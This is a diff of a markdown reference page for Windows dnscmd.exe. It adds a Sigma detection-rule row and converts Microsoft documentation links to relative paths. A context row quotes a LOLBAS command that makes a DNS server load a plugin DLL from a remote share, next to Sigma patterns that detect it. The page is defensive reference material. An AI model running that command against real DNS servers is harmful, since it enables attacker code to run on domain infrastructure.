@@ -43,6 +43,7 @@ SSDEEP | `6144:o5FNqlwAxdeYEsan7TRPrES2LN8s9xi0DCtT1TRep2A+wXz3o:o5FNCreYEscTRPA
 
 Source | Source File | Example | License
 -- | -- | -- | --
+[sigma](https://github.com/Neo23x0/sigma) | [win_exploit_cve_2020_1350.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_1350.yml) | `            - '\System32\dnscmd.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_dns_serverlevelplugindll.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_dns_serverlevelplugindll.yml) | `        CommandLine: 'dnscmd.exe /config /serverlevelplugindll *'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `Name: Dnscmd.exe` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll` | 
@@ -109,7 +110,7 @@ dnscmd [<servername>] /ageallrecords <zonename>[<nodename>] | [/tree]|[/f]
 
 #### Examples
 
-[Example 1: Set the current time on a time stamp to resource records](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-1-set-the-current-time-on-a-time-stamp-to-resource-records)
+[Example 1: Set the current time on a time stamp to resource records](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-1-set-the-current-time-on-a-time-stamp-to-resource-records)
 
 ### dnscmd /clearcache command
 
@@ -390,9 +391,9 @@ dnscmd [<servername>] /enumzones [/primary | /secondary | /forwarder | /stub | /
 
 ##### Examples
 
-- [Example 2: Display a complete list of zones on a DNS server](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-2-display-a-complete-list-of-zones-on-a-dns-server))
+- [Example 2: Display a complete list of zones on a DNS server](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-2-display-a-complete-list-of-zones-on-a-dns-server))
 
-- [Example 3: Display a list of autocreated zones on a DNS server](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-3-display-a-list-of-autocreated-zones-on-a-dns-server)
+- [Example 3: Display a list of autocreated zones on a DNS server](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-3-display-a-list-of-autocreated-zones-on-a-dns-server)
 
 ### dnscmd /exportsettings command
 
@@ -429,9 +430,9 @@ dnscmd [<servername>] /info [<settings>]
 
 ##### Example
 
-- [Example 4: Display the IsSlave setting from a DNS server](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-4-display-the-isslave-setting-from-a-dns-server)
+- [Example 4: Display the IsSlave setting from a DNS server](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-4-display-the-isslave-setting-from-a-dns-server)
 
-- [Example 5: Display the RecursionTimeout setting from a DNS server](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-5-display-the-recursiontimeout-setting-from-a-dns-server)
+- [Example 5: Display the RecursionTimeout setting from a DNS server](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-5-display-the-recursiontimeout-setting-from-a-dns-server)
 
 ### dnscmd /ipvalidate command
 
@@ -481,7 +482,7 @@ dnscmd [<servername>] /nodedelete <zonename> <nodename> [/tree] [/f]
 
 ##### Example
 
-[Example 6: Delete the records from a node](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-6-delete-the-records-from-a-node)
+[Example 6: Delete the records from a node](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-6-delete-the-records-from-a-node)
 
 ### dnscmd /recordadd command
 
@@ -504,7 +505,7 @@ dnscmd [<servername>] /recordadd <zonename> <nodename> <rrtype> <rrdata>
 | `<rrdata>` | Specifies the type of data that is expected. |
 
 > [!NOTE]
-> After you add a record, make sure that you use the correct data type and data format. For a list of resource record types and the appropriate data types, see [Dnscmd Examples](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)).
+> After you add a record, make sure that you use the correct data type and data format. For a list of resource record types and the appropriate data types, see [Dnscmd Examples](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)).
 
 ##### Examples
 
@@ -662,9 +663,9 @@ dnscmd [<servername>] /statistics [<statid>] [/clear]
 
 ##### Examples
 
-- [Example 7: ](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-7-display-time-statistics-for-a-dns-server)
+- [Example 7: ](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-7-display-time-statistics-for-a-dns-server)
 
-- [Example 8: Display NbstatMem statistics for a DNS server](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-8-display-nbstatmem-statistics-for-a-dns-server)
+- [Example 8: Display NbstatMem statistics for a DNS server](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-8-display-nbstatmem-statistics-for-a-dns-server)
 
 ### dnscmd /unenlistdirectorypartition command
 
@@ -778,7 +779,7 @@ dnscmd [<servername>] /zonedelete <zonename> [/dsdel] [/f]
 
 ##### Examples
 
-- [Example 9: Delete a zone from a DNS server](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-9-delete-a-zone-from-a-dns-server)
+- [Example 9: Delete a zone from a DNS server](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-9-delete-a-zone-from-a-dns-server)
 
 ### dnscmd /zoneexport command
 
@@ -800,7 +801,7 @@ dnscmd [<servername>] /zoneexport <zonename> <zoneexportfile>
 
 ##### Examples
 
-- [Example 10: Export zone resource records list to a file](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-10-export-zone-resource-records-list-to-a-file)
+- [Example 10: Export zone resource records list to a file](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-10-export-zone-resource-records-list-to-a-file)
 
 ### dnscmd /zoneinfo
 
@@ -828,9 +829,9 @@ dnscmd [<servername>] /zoneinfo <zonename> [<setting>]
 
 ##### Examples
 
-- [Example 11: Display RefreshInterval setting from the registry](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-11-display-refreshinterval-setting-from-the-registry)
+- [Example 11: Display RefreshInterval setting from the registry](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-11-display-refreshinterval-setting-from-the-registry)
 
-- [Example 12: Display Aging setting from the registry](https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-12-display-aging-setting-from-the-registry)
+- [Example 12: Display Aging setting from the registry](/previous-versions/windows/it-pro/windows-server-2003/cc784399(v=ws.10)#example-12-display-aging-setting-from-the-registry)
 
 ### dnscmd /zonepause command
 
